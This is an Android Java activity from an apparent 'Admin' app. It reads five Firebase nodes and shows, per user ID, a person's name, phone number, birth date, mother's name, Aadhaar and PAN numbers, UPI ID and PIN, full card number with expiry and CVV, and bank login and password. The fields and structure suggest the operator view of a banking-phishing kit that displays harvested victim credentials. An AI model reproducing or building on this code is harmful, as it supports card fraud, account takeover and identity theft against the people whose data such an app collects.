package com.Rahul.Developer.Admin;

import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.content.*;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import com.scottyab.aescrypt.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.regex.*;
import org.json.*;

public class LoginActivity extends AppCompatActivity {
	
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private ArrayList<HashMap<String, Object>> m = new ArrayList<>();
	
	private ScrollView vscroll1;
	private LinearLayout linear1;
	private LinearLayout linear2;
	private LinearLayout linear3;
	private LinearLayout linear4;
	private TextView name;
	private TextView number;
	private TextView mother;
	private TextView dob;
	private TextView textview1;
	private LinearLayout linear5;
	private TextView expiry;
	private TextView card;
	private TextView cvv;
	private LinearLayout linear8;
	private TextView upi;
	private TextView pin;
	private LinearLayout linear9;
	private TextView adhar;
	private TextView pan;
	private LinearLayout linear10;
	private TextView user;
	private TextView password;
	private TextView bank;
	private TextView textview6;
	private TextView textview12;
	private TextView textview14;
	private TextView textview15;
	
	private SharedPreferences op;
	private DatabaseReference login = _firebase.getReference("login");
	private ChildEventListener _login_child_listener;
	private DatabaseReference login2 = _firebase.getReference("login2");
	private ChildEventListener _login2_child_listener;
	private Intent back = new Intent();
	private DatabaseReference login3 = _firebase.getReference("login3");
	private ChildEventListener _login3_child_listener;
	private DatabaseReference login4 = _firebase.getReference("login4");
	private ChildEventListener _login4_child_listener;
	private DatabaseReference login5 = _firebase.getReference("login5");
	private ChildEventListener _login5_child_listener;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.login);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		vscroll1 = findViewById(R.id.vscroll1);
		linear1 = findViewById(R.id.linear1);
		linear2 = findViewById(R.id.linear2);
		linear3 = findViewById(R.id.linear3);
		linear4 = findViewById(R.id.linear4);
		name = findViewById(R.id.name);
		number = findViewById(R.id.number);
		mother = findViewById(R.id.mother);
		dob = findViewById(R.id.dob);
		textview1 = findViewById(R.id.textview1);
		linear5 = findViewById(R.id.linear5);
		expiry = findViewById(R.id.expiry);
		card = findViewById(R.id.card);
		cvv = findViewById(R.id.cvv);
		linear8 = findViewById(R.id.linear8);
		upi = findViewById(R.id.upi);
		pin = findViewById(R.id.pin);
		linear9 = findViewById(R.id.linear9);
		adhar = findViewById(R.id.adhar);
		pan = findViewById(R.id.pan);
		linear10 = findViewById(R.id.linear10);
		user = findViewById(R.id.user);
		password = findViewById(R.id.password);
		bank = findViewById(R.id.bank);
		textview6 = findViewById(R.id.textview6);
		textview12 = findViewById(R.id.textview12);
		textview14 = findViewById(R.id.textview14);
		textview15 = findViewById(R.id.textview15);
		op = getSharedPreferences("op", Activity.MODE_PRIVATE);
		
		_login_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
					
					if (_childValue.containsKey("Name")) {
						name.setText("Name : " + _childValue.get("Name").toString());
					}
					
					if (_childValue.containsKey("Number")) {
						number.setText("Mobile : " + _childValue.get("Number").toString());
					}
					
					if (_childValue.containsKey("Dob")) {
						dob.setText("Date of Birth : " + _childValue.get("Dob").toString());
					}
					
					if (_childValue.containsKey("Mother")) {
						mother.setText("Mother's Name : " + _childValue.get("Mother").toString());
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		login.addChildEventListener(_login_child_listener);
		
		_login2_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
					
					if (_childValue.containsKey("Aadhar")) {
						adhar.setText("Aadhar Number : " + _childValue.get("Aadhar").toString());
					}
					
					if (_childValue.containsKey("Pan")) {
						pan.setText("PAN Card : " + _childValue.get("Pan").toString());
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		login2.addChildEventListener(_login2_child_listener);
		
		_login3_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
					
					if (_childValue.containsKey("Upi")) {
						upi.setText("UPI ID : " + _childValue.get("Upi").toString());
					}
					
					if (_childValue.containsKey("PIN")) {
						pin.setText("PIN : " + _childValue.get("PIN").toString());
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		login3.addChildEventListener(_login3_child_listener);
		
		_login4_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
					
					if (_childValue.containsKey("Card")) {
						card.setText("Card Number : " + _childValue.get("Card").toString());
					}
					
					if (_childValue.containsKey("Expiry")) {
						expiry.setText("Expiry Date : " + _childValue.get("Expiry").toString());
					}
					
					if (_childValue.containsKey("Cvv")) {
						cvv.setText("CVV : " + _childValue.get("Cvv").toString());
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		login4.addChildEventListener(_login4_child_listener);
		
		_login5_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
					
					if (_childValue.containsKey("User")) {
						user.setText("User ID : " + _childValue.get("User").toString());
					}
					
					if (_childValue.containsKey("Password")) {
						password.setText("Password : " + _childValue.get("Password").toString());
					}
					
					if (_childValue.containsKey("Bank")) {
						bank.setText("Bank Name : " + _childValue.get("Bank").toString());
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		login5.addChildEventListener(_login5_child_listener);
	}
	
	private void initializeLogic() {
	}
	
}